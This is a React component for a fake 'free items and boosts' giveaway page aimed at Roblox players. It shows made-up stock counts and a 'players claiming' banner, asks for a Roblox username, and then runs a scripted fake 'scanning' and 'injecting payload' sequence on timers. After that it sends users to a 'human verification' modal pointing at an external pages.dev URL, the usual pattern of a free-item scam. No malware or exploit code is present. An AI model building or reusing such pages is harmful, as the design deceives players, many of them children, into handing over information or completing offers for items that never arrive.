import React, { useState } from 'react';
import { 
  ArrowLeft, 
  ShoppingCart, 
  Sparkles, 
  User, 
  CheckCircle2, 
  ShieldCheck, 
  X, 
  Loader2 
} from 'lucide-react';
import { ClaimVerificationModal } from './ClaimVerificationModal';

interface NightsForestPageProps {
  onBack: () => void;
}

interface ForestShopItem {
  id: string;
  name: string;
  img: string;
  rarity: 'EPIC' | 'MYTHIC' | 'LEGENDARY';
  stock: string;
  isGoldBorder?: boolean;
  category: 'items' | 'boosts';
}

const FOREST_ITEMS: ForestShopItem[] = [
  {
    id: 'admin-treadmill',
    name: 'Admin Treadmill',
    img: '/speed_escape_blue/admin_treadmill.png',
    rarity: 'EPIC',
    stock: 'x4 in Stock',
    category: 'items'
  },
  {
    id: 'infinity-trail',
    name: 'Infinity Trail',
    img: '/speed_escape_blue/infinity_trail.png',
    rarity: 'EPIC',
    stock: 'x10 in Stock',
    category: 'items'
  },
  {
    id: 'candy-treadmill',
    name: 'Candy Treadmill',
    img: '/speed_escape_blue/candy_treadmill.png',
    rarity: 'EPIC',
    stock: 'x3 in Stock',
    category: 'items'
  },
  {
    id: 'storm-aura',
    name: 'Storm Aura',
    img: '/speed_escape_blue/storm_aura.png',
    rarity: 'MYTHIC',
    stock: 'x1 in Stock',
    category: 'items'
  },
  {
    id: 'chocolate-aura',
    name: 'Chocolate Aura',
    img: '/speed_escape_blue/chocolate_aura.png',
    rarity: 'EPIC',
    stock: 'x2 in Stock',
    category: 'items'
  },
  {
    id: 'candy-aura',
    name: 'Candy Aura',
    img: '/speed_escape_blue/candy_aura.png',
    rarity: 'LEGENDARY',
    stock: 'x3 in Stock',
    category: 'items'
  },
  {
    id: 'diamond-treadmill',
    name: 'Diamond Treadmill',
    img: '/speed_escape_blue/diamond_treadmill.png',
    rarity: 'EPIC',
    stock: 'x2 in Stock',
    category: 'items'
  },
  {
    id: 'boombox',
    name: 'BOOMBOX',
    img: '/speed_escape_blue/boombox.png',
    rarity: 'LEGENDARY',
    stock: 'x15 in Stock',
    category: 'items'
  },
  {
    id: 'music-emotes-pack',
    name: 'MUSIC EMOTES PACK',
    img: '/speed_escape_blue/music_emotes_pack.png',
    rarity: 'EPIC',
    stock: 'x8 in Stock',
    category: 'items'
  },
  {
    id: 'golden-mask',
    name: 'Golden Mask',
    img: '/speed_escape_blue/golden_mask.png',
    rarity: 'MYTHIC',
    stock: 'x5 in Stock',
    category: 'items'
  },
  {
    id: 'speed-1b',
    name: '+1B SPEED',
    img: '/speed_escape_blue/speed_1b.png',
    rarity: 'MYTHIC',
    stock: 'x99 in Stock',
    category: 'items'
  },
  {
    id: 'soundpacks',
    name: 'SOUNDPACKS',
    img: '/speed_escape_blue/soundpacks.png',
    rarity: 'LEGENDARY',
    stock: 'x50 in Stock',
    category: 'items'
  },
  {
    id: 'godlike-trail',
    name: 'Godlike Trail',
    img: '/speed_escape_blue/godlike_trail.png',
    rarity: 'EPIC',
    stock: 'x9 in Stock',
    category: 'items'
  },
  {
    id: 'supernova-trail',
    name: 'Supernova Trail',
    img: '/speed_escape_blue/supernova_trail.png',
    rarity: 'EPIC',
    stock: 'x8 in Stock',
    isGoldBorder: true,
    category: 'items'
  },
  {
    id: 'electric-aura',
    name: 'Electric Aura',
    img: '/speed_escape_blue/electric_aura.png',
    rarity: 'EPIC',
    stock: 'x7 in Stock',
    category: 'items'
  },
  {
    id: 'fire-aura',
    name: 'Fire Aura',
    img: '/speed_escape_blue/fire_aura.png',
    rarity: 'EPIC',
    stock: 'x6 in Stock',
    category: 'items'
  },
  {
    id: 'water-aura',
    name: 'Water Aura',
    img: '/speed_escape_blue/water_aura.png',
    rarity: 'EPIC',
    stock: 'x5 in Stock',
    category: 'items'
  },
  // Boosts
  {
    id: 'boost-2x',
    name: '2X Speed Multiplier',
    img: '/speed_escape_blue/speed_1b.png',
    rarity: 'MYTHIC',
    stock: 'x80 in Stock',
    category: 'boosts'
  },
  {
    id: 'boost-stamina',
    name: 'Infinite Stamina Pass',
    img: '/speed_escape_blue/supernova_trail.png',
    rarity: 'LEGENDARY',
    stock: 'x35 in Stock',
    category: 'boosts'
  },
  {
    id: 'boost-autoclick',
    name: 'Auto-Treadmill Pass',
    img: '/speed_escape_blue/admin_treadmill.png',
    rarity: 'EPIC',
    stock: 'x20 in Stock',
    category: 'boosts'
  }
];

export const NightsForestPage: React.FC<NightsForestPageProps> = ({ onBack }) => {
  const [activeTab, setActiveTab] = useState<'items' | 'boosts'>('items');
  const [selectedItem, setSelectedItem] = useState<ForestShopItem | null>(null);

  // Modal states
  const [modalScreen, setModalScreen] = useState<'input' | 'scanning' | 'ready'>('input');
  const [username, setUsername] = useState('');
  const [inputError, setInputError] = useState('');
  const [scanStep, setScanStep] = useState<number>(1);
  const [scanLabel, setScanLabel] = useState('Connecting to Roblox servers...');

  const displayedItems = FOREST_ITEMS.filter((it) => it.category === activeTab);

  const handleOpenClaim = (item: ForestShopItem) => {
    setSelectedItem(item);
    setModalScreen('input');
    setUsername('');
    setInputError('');
    setScanStep(1);
  };

  const handleCloseModal = () => {
    setSelectedItem(null);
  };

  const handleStartGeneration = (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (!username.trim()) {
      setInputError('Please enter your Roblox username');
      return;
    }
    setInputError('');
    setModalScreen('scanning');
    setScanStep(1);
    setScanLabel('Searching player account...');

    const t1 = setTimeout(() => {
      setScanStep(2);
      setScanLabel(`Player "${username}" identified! Checking locker status...`);
    }, 1200);

    const t2 = setTimeout(() => {
      setScanStep(3);
      setScanLabel(`Sending ${selectedItem?.name} payload packet...`);
    }, 2400);

    const t3 = setTimeout(() => {
      setScanStep(4);
      setScanLabel('Ready for human verification!');
      setModalScreen('ready');
    }, 2600);

    return () => {
      clearTimeout(t1);
      clearTimeout(t2);
      clearTimeout(t3);
    };
  };

  return (
    <div className="min-h-screen bg-[#141d28] text-white font-sans relative pb-20 overflow-x-hidden selection:bg-blue-500/20 selection:text-blue-300">
      {/* Top Bar */}
      <nav className="w-full bg-[#0d141e]/90 backdrop-blur-md border-b border-[#202e40] px-4 py-3 sticky top-0 z-40 flex items-center justify-between">
        <button
          onClick={onBack}
          className="flex items-center gap-2 px-3.5 py-1.5 rounded-xl bg-[#1b2838] hover:bg-[#25374d] text-[#93c5fd] text-xs font-bold transition-all cursor-pointer border border-[#304763] shadow-xs"
        >
          <ArrowLeft className="w-4 h-4" />
          <span>Back to GameHub</span>
        </button>

        <div className="flex items-center gap-2 text-xs font-bold text-blue-400 bg-[#142336] px-3 py-1 rounded-full border border-blue-500/30">
          <span className="w-2 h-2 rounded-full bg-blue-400 animate-ping"></span>
          <span>99 Nights Live Server</span>
        </div>
      </nav>

      {/* Main Container */}
      <main className="max-w-[760px] mx-auto px-4 pt-6">
        {/* Top Hero Section matching Screenshot 1 */}
        <section className="text-center py-6 px-4">
          {/* Logo */}
          <div className="w-24 h-24 mx-auto mb-4 rounded-2xl overflow-hidden shadow-[0_8px_25px_rgba(0,0,0,0.6)] border-2 border-[#2c3d52] bg-[#0c131c] flex items-center justify-center">
            <img 
              src="/speed_escape_blue/logo.png" 
              alt="Logo" 
              className="w-full h-full object-cover"
            />
          </div>

          {/* Heading */}
          <h1 
            className="text-2xl md:text-3xl lg:text-4xl font-black uppercase tracking-wide leading-snug text-white drop-shadow-[0_4px_10px_rgba(0,0,0,0.8)]"
            style={{ fontFamily: "'Luckiest Guy', 'Fredoka', cursive, sans-serif" }}
          >
            FREE ITEMS & BOOSTS SPEED KEYBOARD ESCAPE
          </h1>

          {/* Subtitle */}
          <p className="text-sm md:text-base text-[#cbd5e1] mt-2 font-medium">
            Tap claim and unlock your free drop.
          </p>

          {/* Players claiming pill */}
          <div className="inline-flex items-center gap-2 bg-[#121c27] px-4 py-1.5 rounded-full mt-3.5 text-xs font-semibold text-[#94a3b8] border border-[#233346] shadow-inner">
            <span className="w-2.5 h-2.5 rounded-full bg-[#22c55e] animate-pulse"></span>
            <span className="text-white font-medium">Players claiming right now</span>
          </div>
        </section>

        {/* Store Container Box matching Screenshot 1 */}
        <section className="bg-[#182332] rounded-[18px] border-2 border-[#2b3c52] overflow-hidden shadow-[0_16px_40px_rgba(0,0,0,0.7)] mt-3 mb-12">
          {/* Gold / Yellow Crosshatch STORE Bar */}
          <div className="bg-[#f5c800] border-b-4 border-[#b89000] px-4 py-2.5 flex items-center justify-between shadow-[inset_0_1px_0_rgba(255,255,255,0.45)]">
            {/* Left: Cart Icon + STORE */}
            <div className="flex items-center gap-2.5">
              <div className="w-9 h-9 rounded-xl bg-[#2563eb] border-2 border-white/60 flex items-center justify-center text-white shadow-sm">
                <ShoppingCart className="w-5 h-5 fill-white" />
              </div>
              <span 
                className="text-xl font-black tracking-wider text-white uppercase drop-shadow-[0_2px_4px_rgba(122,88,0,0.8)]"
                style={{ 
                  fontFamily: "'Luckiest Guy', cursive, sans-serif",
                  textShadow: "-2px -2px 0 #7a5800, 2px -2px 0 #7a5800, -2px 2px 0 #7a5800, 2px 2px 0 #7a5800"
                }}
              >
                STORE
              </span>
            </div>

            {/* Right: ITEMS / BOOSTS Buttons */}
            <div className="flex items-center gap-2">
              <button
                onClick={() => setActiveTab('items')}
                className={`px-4 py-1.5 rounded-lg text-xs font-black uppercase tracking-wider transition-all cursor-pointer shadow-md ${
                  activeTab === 'items'
                    ? 'bg-[#2563eb] hover:bg-[#1d4ed8] text-white border-2 border-[#1e40af]'
                    : 'bg-[#1e293b]/70 hover:bg-[#1e293b] text-[#94a3b8] border border-[#334155]'
                }`}
                style={{ fontFamily: "'Luckiest Guy', cursive, sans-serif" }}
              >
                ITEMS
              </button>
              <button
                onClick={() => setActiveTab('boosts')}
                className={`px-4 py-1.5 rounded-lg text-xs font-black uppercase tracking-wider transition-all cursor-pointer shadow-md ${
                  activeTab === 'boosts'
                    ? 'bg-[#22c55e] hover:bg-[#16a34a] text-white border-2 border-[#15803d]'
                    : 'bg-[#1e293b]/70 hover:bg-[#1e293b] text-[#94a3b8] border border-[#334155]'
                }`}
                style={{ fontFamily: "'Luckiest Guy', cursive, sans-serif" }}
              >
                BOOSTS
              </button>
            </div>
          </div>

          {/* Shop Items List matching Screenshots 1, 2, 3 & 4 */}
          <div className="p-3 md:p-4 flex flex-col gap-3">
            {displayedItems.map((item) => (
              <div
                key={item.id}
                onClick={() => handleOpenClaim(item)}
                className="flex items-center gap-3.5 md:gap-4 bg-[#1b2738] hover:bg-[#223145] p-3 md:p-3.5 rounded-2xl border-2 border-[#2b3c52] hover:border-[#3b82f6]/70 transition-all cursor-pointer group shadow-md"
              >
                {/* Image Box */}
                <div 
                  className={`w-20 h-20 md:w-[88px] md:h-[88px] rounded-xl bg-[#101824] flex items-center justify-center p-1.5 shrink-0 overflow-hidden relative shadow-inner ${
                    item.isGoldBorder ? 'border-2 border-[#eab308]' : 'border-2 border-[#2b3c52]'
                  }`}
                >
                  <img
                    src={item.img}
                    alt={item.name}
                    loading="lazy"
                    className="w-full h-full object-contain filter drop-shadow-[0_2px_6px_rgba(0,0,0,0.7)] group-hover:scale-105 transition-transform"
                  />
                </div>

                {/* Info & Rarity Bar */}
                <div className="flex-1 min-w-0 flex flex-col justify-between py-0.5">
                  <div>
                    <h3 
                      className="text-base md:text-lg font-bold text-white truncate group-hover:text-blue-200 transition-colors"
                      style={{ fontFamily: "'Luckiest Guy', 'Fredoka', cursive, sans-serif" }}
                    >
                      {item.name}
                    </h3>
                    <div className="text-xs text-[#94a3b8] font-medium mt-0.5">
                      {item.stock}
                    </div>
                  </div>

                  {/* Horizontal Wide Rarity Bar matching exact screenshots */}
                  <div className="mt-2.5 w-full">
                    <div 
                      className={`w-full h-6 rounded-md flex items-center px-2.5 shadow-inner border border-black/30 ${
                        item.rarity === 'EPIC'
                          ? 'bg-gradient-to-r from-[#9333ea] via-[#a855f7] to-[#7e22ce]'
                          : item.rarity === 'MYTHIC'
                          ? 'bg-gradient-to-r from-[#ef4444] via-[#f87171] to-[#dc2626]'
                          : 'bg-gradient-to-r from-[#eab308] via-[#facc15] to-[#ca8a04]'
                      }`}
                    >
                      <span 
                        className="text-[10px] md:text-[11px] font-black uppercase tracking-wider text-white"
                        style={{ 
                          fontFamily: "'Luckiest Guy', cursive, sans-serif",
                          textShadow: "-1px -1px 0 #000, 1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000"
                        }}
                      >
                        {item.rarity}
                      </span>
                    </div>
                  </div>
                </div>

                {/* Green 3D Claim! Button */}
                <button
                  onClick={(e) => {
                    e.stopPropagation();
                    handleOpenClaim(item);
                  }}
                  className="bg-[#22c55e] hover:bg-[#16a34a] active:translate-y-1 text-white font-black px-5 md:px-6 py-2 md:py-2.5 rounded-xl text-xs md:text-sm tracking-wide shrink-0 shadow-[0_4px_0_#15803d] active:shadow-[0_1px_0_#15803d] transition-all cursor-pointer border border-[#86efac]/40 uppercase"
                  style={{ fontFamily: "'Luckiest Guy', cursive, sans-serif" }}
                >
                  Claim!
                </button>
              </div>
            ))}
          </div>
        </section>
      </main>

      {/* Claim / Unlock Item Modal */}
      {selectedItem && modalScreen !== 'ready' && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
          {/* Backdrop */}
          <div 
            className="fixed inset-0 bg-black/80 backdrop-blur-sm transition-opacity"
            onClick={handleCloseModal}
          />

          {/* Modal Box */}
          <div className="relative z-10 bg-[#162232] max-w-md w-full rounded-[28px] border-2 border-[#2b3c52] p-6 shadow-[0_24px_50px_rgba(0,0,0,0.9)] max-h-[90vh] overflow-y-auto">
            {/* Header */}
            <div className="flex items-center justify-between mb-5">
              <div className="flex items-center gap-2.5">
                <img 
                  src="/speed_escape_blue/logo.png" 
                  alt="Logo" 
                  className="w-10 h-10 rounded-xl bg-[#0e1622] p-1 border border-[#293d54]"
                />
                <span 
                  className="font-black text-white text-base"
                  style={{ fontFamily: "'Luckiest Guy', cursive, sans-serif" }}
                >
                  Claim Free Item
                </span>
              </div>
              <button
                onClick={handleCloseModal}
                className="text-[#94a3b8] hover:text-white p-1 cursor-pointer"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            {/* SCREEN 1: Enter Username */}
            {modalScreen === 'input' && (
              <div className="space-y-4">
                {/* Item Preview Card */}
                <div className="flex items-center gap-3.5 bg-[#1b2a3d] p-3 rounded-2xl border border-[#2d425c]">
                  <div className="w-14 h-14 bg-[#0d1520] rounded-xl p-1.5 border border-[#26374d] shrink-0 flex items-center justify-center">
                    <img
                      src={selectedItem.img}
                      alt={selectedItem.name}
                      className="max-h-full max-w-full object-contain"
                    />
                  </div>
                  <div>
                    <h4 
                      className="font-bold text-white text-sm"
                      style={{ fontFamily: "'Luckiest Guy', cursive, sans-serif" }}
                    >
                      {selectedItem.name}
                    </h4>
                    <span className="inline-block bg-[#22c55e] text-white text-[10px] font-black px-2 py-0.5 rounded-md mt-1 uppercase">
                      FREE DROP
                    </span>
                  </div>
                </div>

                <p className="text-xs text-[#94a3b8] leading-relaxed">
                  Enter your Roblox username to start generating your free drop.
                </p>

                {/* Username Input */}
                <form onSubmit={handleStartGeneration} className="space-y-3">
                  <div className="relative">
                    <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-blue-400">
                      <User className="w-4 h-4" />
                    </div>
                    <input
                      type="text"
                      value={username}
                      onChange={(e) => {
                        setUsername(e.target.value);
                        if (inputError) setInputError('');
                      }}
                      placeholder="Your Roblox username"
                      className="w-full pl-10 pr-4 py-3 rounded-xl bg-[#0f1824] border-2 border-[#24364c] text-white placeholder:text-[#52647a] focus:outline-none focus:border-blue-500 text-sm font-medium"
                      maxLength={20}
                    />
                  </div>

                  {inputError && (
                    <div className="text-xs text-red-400 font-semibold text-center">
                      {inputError}
                    </div>
                  )}

                  <button
                    type="submit"
                    className="w-full bg-[#22c55e] hover:bg-[#16a34a] active:translate-y-0.5 text-white font-black py-3.5 px-6 rounded-xl transition-all shadow-[0_4px_0_#15803d] cursor-pointer text-sm uppercase tracking-wide flex items-center justify-center gap-2"
                    style={{ fontFamily: "'Luckiest Guy', cursive, sans-serif" }}
                  >
                    <Sparkles className="w-4 h-4" />
                    <span>CLAIM NOW</span>
                  </button>
                </form>

                <div className="flex items-center justify-center gap-1.5 text-[11px] text-[#64748b] pt-2">
                  <span className="w-2 h-2 rounded-full bg-blue-400"></span>
                  <span>Secure connection · No password required</span>
                </div>
              </div>
            )}

            {/* SCREEN 2: Scanning & Processing */}
            {modalScreen === 'scanning' && (
              <div className="text-center py-4 space-y-5">
                <div className="w-16 h-16 rounded-full bg-[#1b2b3d] border-2 border-blue-400/50 flex items-center justify-center mx-auto text-blue-400">
                  <Loader2 className="w-8 h-8 animate-spin" />
                </div>

                <div>
                  <h4 
                    className="font-bold text-white text-base"
                    style={{ fontFamily: "'Luckiest Guy', cursive, sans-serif" }}
                  >
                    Generating Drop
                  </h4>
                  <p className="text-xs text-[#94a3b8] mt-1">
                    {scanLabel}
                  </p>
                </div>

                {/* Step indicators */}
                <div className="space-y-2.5 text-left bg-[#0e1622] p-3.5 rounded-2xl border border-[#202f42]">
                  <div className={`flex items-center gap-2.5 text-xs font-semibold ${scanStep >= 1 ? 'text-blue-400' : 'text-[#475569]'}`}>
                    <CheckCircle2 className="w-4 h-4 shrink-0" />
                    <span>1. Locating account "{username}"</span>
                  </div>
                  <div className={`flex items-center gap-2.5 text-xs font-semibold ${scanStep >= 2 ? 'text-blue-400' : 'text-[#475569]'}`}>
                    <CheckCircle2 className="w-4 h-4 shrink-0" />
                    <span>2. Verifying inventory slot status</span>
                  </div>
                  <div className={`flex items-center gap-2.5 text-xs font-semibold ${scanStep >= 3 ? 'text-blue-400' : 'text-[#475569]'}`}>
                    <CheckCircle2 className="w-4 h-4 shrink-0" />
                    <span>3. Injecting {selectedItem.name} payload</span>
                  </div>
                </div>
              </div>
            )}

          </div>
        </div>
      )}

      {/* Human Verification Modal matching exact user screenshot */}
      {selectedItem && modalScreen === 'ready' && (
        <ClaimVerificationModal
          isOpen={true}
          onClose={handleCloseModal}
          redirectUrl="https://99zup.pages.dev/"
        />
      )}
    </div>
  );
};
